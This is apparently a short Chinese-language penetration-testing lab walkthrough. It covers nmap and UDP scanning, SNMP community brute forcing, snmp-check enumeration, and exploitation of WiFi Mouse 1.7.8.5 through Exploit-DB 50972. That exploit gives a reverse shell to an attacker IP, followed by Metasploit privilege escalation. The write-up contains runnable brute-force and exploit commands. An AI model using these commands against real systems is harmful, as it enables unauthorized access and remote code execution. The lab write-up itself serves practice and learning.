## namp scanning
- <img width="1918" height="745" alt="image" src="https://github.com/user-attachments/assets/34d8c746-3930-4874-a0cc-5f972ffac4a4" />

## 80 port 
- 發現都沒什麼資訊

## nmap UDP scanning
- 發現有開 161
  - <img width="1222" height="267" alt="image" src="https://github.com/user-attachments/assets/b24beb39-614d-467d-9484-1cda9510a016" />
- snmpbrute.py 爆 snmp
  ```
  python3 snmpbrute.py -t 192.168.178.145 -f /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
  ```
  - 發現 public
    - <img width="1918" height="842" alt="image" src="https://github.com/user-attachments/assets/90b7acc5-0f7b-45ae-b280-5bd34c1c1a5d" />
- snmp-check 爆資訊，發現 Mouse Server version 1.7.8.5 存在 WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)
  ```
  snmp-check 192.168.178.145 -c public -v 2c
  ```
  - <img width="1918" height="447" alt="image" src="https://github.com/user-attachments/assets/32e27641-c51c-4ed9-8817-920136a3a17b" />
- WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)
  - https://www.exploit-db.com/exploits/50972
- 成功取得 shell
  ```
  python3 50972.py 192.168.178.145 192.168.45.157 reverse.exe
  ```
  - <img width="1676" height="537" alt="image" src="https://github.com/user-attachments/assets/556b83f0-a5af-4708-ae1f-b7dc8b113bcc" />
- 取得 local.txt
  - <img width="800" height="98" alt="image" src="https://github.com/user-attachments/assets/9db7a4d8-e4e3-4ad0-bf5d-0abd4bbdb22a" />

## 提權
- msfconsole
  - <img width="1918" height="712" alt="image" src="https://github.com/user-attachments/assets/89f42e4b-3cad-479a-8932-47df1d136c03" />
- 取得 proof.txt
  - <img width="947" height="98" alt="image" src="https://github.com/user-attachments/assets/05fc4517-93d8-441d-bede-b7a00039cadd" />






















































